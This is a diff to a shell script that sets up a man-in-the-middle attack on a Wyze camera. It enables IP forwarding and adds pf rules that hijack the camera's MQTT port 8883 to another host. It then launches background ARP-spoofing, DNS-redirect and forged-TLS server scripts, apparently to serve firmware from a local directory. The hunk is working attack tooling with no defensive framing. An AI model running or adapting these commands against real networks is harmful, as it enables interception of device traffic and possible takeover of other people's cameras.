@@ -8,6 +8,11 @@ CAM="${1:-192.168.4.24}"; CAMMAC="${2:-80:48:2c:4b:cf:0b}"; GW="${3:-192.168.4.1
 UP="${5:-192.168.4.160}"
 
 sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
+# no DNS dependency: DNAT the broker port for this camera to us, and NAT its other traffic out the
+# real interface so it keeps working while we are its gateway.
+printf 'rdr pass on en1 proto tcp from %s to any port 8883 -> %s port 8883\nnat on en0 from %s to any -> (en0)\n' "$CAM" "$UP" "$CAM" \
+  | sudo pfctl -a fss -f - 2>/dev/null
+sudo pfctl -e 2>/dev/null
 sudo nohup "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
 sudo nohup /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAMMAC" "$GW" "$GWMAC" > /dev/null 2>&1 &
 sudo nohup "$PY" "$HERE/wyze_forge_serve.py" --dir /tmp/fwserve --port 443 > /tmp/tls.log 2>&1 &
